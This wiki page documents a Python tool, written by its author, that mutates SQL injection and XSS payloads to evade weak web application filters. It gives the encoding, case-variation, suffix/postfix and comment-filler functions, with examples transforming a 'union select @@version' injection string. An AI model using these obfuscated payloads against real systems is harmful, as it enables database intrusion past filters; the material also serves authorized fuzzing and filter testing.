----
== *Features* ==
----

For SQL injection attack types described in the introduction page there is a tool written by Gerasimos Kassaras (this is me) that can obfuscate SQL payloads (and other payloads), it is the Teenage Mutant Ninja Turtle tool.

The Teenage Mutant Ninja Turtles project supports the following features: 

  # Payload de-duplication.
  # Payload base64 encoding.
  # Payload url encoding.
  # Payload suffix adding.
  # Payload postfix adding.
  # Payload hex encoding.
  # Paylaod case variation.

The teenage-mutant-ninja-turtles tool is providing you with an easy way to generate Obfuscated Fuzzing payloads in order to bypass badly implemented Web Application filters (e.t.c SQL Injection filters, XSS Injections filters e.t.c). The tool takes as an input an option and a file name and spits out a file with the obfuscated strings.

== Functions that mutate the original payload file ==

This function does not do any payload obfuscation, it only does payload line DE-duplication (e.g. removes double lines):
----
{{{

def deduplicate(_payloadList):
 
 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"deduplicatedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 _deduplictedList = list(set(_payloadList))
 
 for line in _deduplictedList:
  _mutatePayloadFileObj.write(line)
  
 _mutatePayloadFileObj.close()

}}}
----
  * Example of the de-duplicator:

Input payload file content: 

  # ' union (select @@version) --
  # ' union (select @@version) --
  # );' union (select @@version) --

Output payload file content: 

  # ' union (select @@version) --
  # );' union (select @@version) --

*Note*: The tmntv1.4 tool will take as an input a file. 

This function adds case variation:
----
{{{

#----------------------------------------------------------------------------------------

def addCaseVarietionToKeyword(_sqlKeyword):

 list1 = list(_sqlKeyword)

 for i in range(len(list1)):
  if i % 2 == 0:
   list1[i] = (list1[i].upper())
  else:
   list1[i] = (list1[i].lower())

 _sqlKeyword = ''.join(list1)

 return str(_sqlKeyword).rstrip()

#----------------------------------------------------------------------------------------

def searchPayloadLine(_keywordList, _payloadLine):
    # Search payload line with all SQL keywords contained in file CharContainer
    for _keyword in _keywordList:
        if re.search(_keyword.upper(),_payloadLine):
            return True
        if re.search(_keyword.lower(),_payloadLine):
            return True
    else:
        return False 

#----------------------------------------------------------------------------------------

def caseVarietionAdder(_payloadList): # Adding case variation
 
 checkDirectoryExitstance() 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime+"caseVarietionPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"a")
 
 _sqlKeywordElementsFile = sqlKeywordFile
 _sqlKeywordElementsFileObj = open(_sqlKeywordElementsFile,"r")
 _sqlKeywordList = _sqlKeywordElementsFileObj.readlines()

 _temp = open("temp.ls","a+")
 _tempList = _payloadList
 
 _sqlKeyWordDictionary = {} # Holding SQL keywords mapping them to SQL keywords with case variation
 _searchList = [] # Holding only SQL keywords for later searching
 
 # Populate dictionary with SQL keywords and equvalent SQL keyword values with case variation
 for _sqlKeyword in _sqlKeywordList:
    _sqlKeyWordDictionary[str(_sqlKeyword).rstrip()] = addCaseVarietionToKeyword(_sqlKeyword)

 # Populate list with SQL keywords for searching later on
 for _sqlKeywordKey, _sqlKeywordValue in _sqlKeyWordDictionary.iteritems():
    _searchList.append(_sqlKeywordKey)

 # Write Temporary file with new payloads then filter lines to write to final payload file 
 for _tempLine in  _tempList:
    for _sqlKeywordKey, _sqlKeywordValue  in _sqlKeyWordDictionary.iteritems():
        if re.search(_sqlKeywordKey.upper(),_tempLine):
            _tempLine = str(_tempLine).replace(_sqlKeywordKey.upper(),_sqlKeywordValue)

            if not searchPayloadLine(_searchList,_tempLine):
                _mutatePayloadFileObj.write(_tempLine)
            
        if re.search(_sqlKeywordKey.lower(),_tempLine):
            _tempLine = str(_tempLine).replace(_sqlKeywordKey.lower(),_sqlKeywordValue)
            
            if not searchPayloadLine(_searchList,_tempLine):
                _mutatePayloadFileObj.write(_tempLine)

 _mutatePayloadFileObj = _temp
 _temp.close()
 _mutatePayloadFileObj.close()

}}}
----
  * Example of Case Variation Adder:

Input payload file content: ' union (select @@version) --

Output payload file content: ' UnIoN (SeLeCt @@VeRsIoN) --

*Note*: The tmntv1.4 tool will take as an input a file, it will then load SQL keywords from the CharContainer/sql_Keyword_Container.lst file and generate a payload file with SQL keywords having case variation.

This function adds suffixes such as );-- :
----
{{{

def suffixAdder(_payloadList): # Adding suffixes
 
 checkDirectoryExitstance() 
 
 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"suffixedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _suffixElementsFile = suffixFile
 _suffixElementObj = open(_suffixElementsFile,"r")
    
 _suffixList = _suffixElementObj.readlines()
 
 for _suffix in _suffixList: 
  for _payloadline in _payloadList:
   _mutatePayloadFileObj.write(str(_suffix).rstrip()+str(_payloadline).rstrip()+"\n")

 _mutatePayloadFileObj.close()

}}}
----
  * Example of Suffix Adder:

Input payload file content: ' union (select @@version) --

Output payload file content: );' union (select @@version) --

*Note*: The tmntv1.4 tool will take as an input a file.Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  

This function adds postfixes e.g. %00 etc :
----
{{{

def postfixAdder(_payloadList): # Adding postfixes
    
 checkDirectoryExitstance() 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime = getTime()+'_'+"postfixedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _postfixElementsFile = postfixFile
 _postfixElementObj = open(_postfixElementsFile,"r")
    
 _postfixList = _postfixElementObj.readlines()
 
 for _postfix in _postfixList: 
  for _payloadline in _payloadList:
    _mutatePayloadFileObj.write(str(_payloadline).rstrip()+str(_postfix).rstrip()+"\n")
    
 _mutatePayloadFileObj.close()

}}}
----
  * Example of Postfix Adder:

Input payload file content: ' union (select @@version) --

Output payload file content:  ' union (select @@version) --%00

*Note*: The tmntv1.4 tool will take as an input a file. Also the Suffix Adder will read through the Suffix File and add all listed suffixes.  

This function does url encoding:
----
{{{

def urlEncoder(_payloadList): # Do url encoding 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime = getTime()+'_'+"urlEncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write((urllib.urlencode({'q':str(_payloadline).rstrip()})).replace("q=", "")+"\n")

 _mutatePayloadFileObj.close()

}}}
----
  * Example of URL Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: %27+union+%28select+%40%40version%29+--

*Note*: The tmntv1.4 tool will take as an input a file. 

This function base 64 encoding:
----
{{{

def base64Encoder(_payloadList): # Adding suffix 

 currentTime = getTime()+'_'
 
 _mutatePayloadFile = currentTime+"base64EncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write(base64.b64encode(str(_payloadline).rstrip())+"\n")

 _mutatePayloadFileObj.close()

}}}
----
  * Example of base64 Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: JyB1bmlvbiAoc2VsZWN0IEBAdmVyc2lvbikgLS0=

*Note*: The tmntv1.4 tool will take as an input a file. 

This function does hexadecimal encoding:
----
{{{

def hexEncoder(_payloadList): # Adding suffix 

 currentTime = getTime()+'_'

 _mutatePayloadFile =  currentTime +"hexEncodedPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")
 
 for _payloadline in _payloadList:
  _mutatePayloadFileObj.write((str(_payloadline).rstrip()).encode("Hex")+"\n")

 _mutatePayloadFileObj.close()

}}}
----
  * Example of Hexadecimal Encoder:

Input payload file content: ' union (select @@version) --

Output payload file content: 2720756e696f6e202873656c65637420404076657273696f6e29202d2d

*Note*: The tmntv1.4 tool will take as an input a file. 

This function does white space filling:

{{{

def replacer(_payloadList): # Filling the gaps 

 currentTime = getTime()+'_'

 _mutatePayloadFile = currentTime+"spaceFilledPayloads.lst"
 _mutatePayloadFileObj = open(_mutatePayloadFile,"w")

 _space_FillerElementsFile = fillerFile
 _space_FillerElementObj = open(_space_FillerElementsFile,"r")
    
 _space_FillerList = _space_FillerElementObj.readlines()
 
 for _space_Filler in _space_FillerList: 
  for _payloadline in _payloadList:
   _mutatePayloadFileObj.write(( _payloadline + '\n' ).replace(" ",_space_Filler.rstrip()))

 _mutatePayloadFileObj.close()

}}}
----
  * Example of replacer:

Input payload file content: ' union (select @@version) --

Output payload file content: '/SQL COMMENT/union/SQL COMMENT/(select/SQL COMMENT/@@version)/**/--

*Note*: The tmntv1.4 tool will take as an input a file. The replacer will load the CharContainer/space_Filler_Container.lst keywords and replace all spaces from the payload. The filler file contains SQL comments and mutated SQL comments.  